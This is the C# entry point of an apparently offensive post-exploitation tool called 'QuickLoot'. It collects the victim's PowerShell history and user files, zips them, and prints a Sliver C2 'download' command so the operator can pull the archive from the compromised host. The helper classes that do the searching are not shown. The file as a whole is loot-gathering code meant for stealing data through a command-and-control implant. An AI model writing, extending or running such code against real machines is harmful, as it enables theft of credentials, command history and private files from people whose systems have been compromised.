using System;
using System.IO;
using System.IO.Compression;

namespace QuickLoot
{
    public class Program
    {
          public static void Main()
        {
            Console.WriteLine("[*] Getting users powershell history");
            string historyFile = HistorySearcher.GetHistory();

            Console.WriteLine("[*] Getting users files");
            string lootFile = FileSearcher.EnumerateFiles();

            Console.WriteLine("[*] Zipping collected files");
            string[] filesToZip = {historyFile, lootFile};
            string zipfile = Zipper.ZipFiles(filesToZip);

            string sliverCommand = $"download {zipfile}";

            Console.WriteLine("[*] If in sliver get zip with command:");
            Console.WriteLine("");
            Console.WriteLine(sliverCommand);
        }
    }
}
